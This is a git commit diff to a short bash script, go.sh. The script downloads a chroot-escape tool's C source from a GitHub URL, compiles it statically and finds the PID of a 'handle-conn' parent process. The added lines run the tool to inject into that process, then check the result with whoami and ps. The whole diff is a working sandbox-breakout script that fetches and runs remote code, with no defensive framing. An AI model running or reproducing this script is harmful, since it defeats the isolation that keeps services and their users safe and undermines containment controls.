d16c5a8c2ded4f145dfa5b8e6cbed265f4643bfc
Edward Mead <emead@indeed.com>
2018-10-29 16:10:50 +0900

    add logic to pid inject into parent

--- go.sh
+++ go.sh
@@ -1,10 +1,16 @@
 #!/bin/bash
-curl -L-o lol.c https://github.com/emead-indeed/chw00t/raw/master/chw00t.c
+set +eo pipefail
+curl -Lo lol.c https://github.com/emead-indeed/chw00t/raw/master/chw00t.c
 ls -al 1>&2
 /usr/bin/gcc lol.c -o lol -static 1>&2
 ls -al 1>&2
 ps faux &> lol.plist
 grep handle-conn lol.plist &> lol.pdetails
 head -n1 lol.pdetails &> lol.pdetail
-PPID=`awk '{print $2}' lol.pdetail`
-echo ppid:$PPID 1>&2
+chPPID=`awk '{print $2}' lol.pdetail`
+echo ppid:$chPPID 1>&2
+./lol -6 --pid $chPPID ||
+	./lol -7 --pid $chPPID
+ls -al
+whoami
+ps faux
